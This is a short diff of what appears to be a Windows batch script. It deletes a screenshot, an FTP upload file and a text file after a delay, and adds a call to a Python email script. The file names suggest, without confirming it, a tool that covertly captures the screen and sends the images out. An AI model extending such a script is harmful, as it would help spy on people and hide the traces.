@@ -21,3 +21,5 @@ choice /t %delay% /d y /n >nul
 del screen.png
 del ftp.up	
 del screen.txt
+python _email.py
+exit
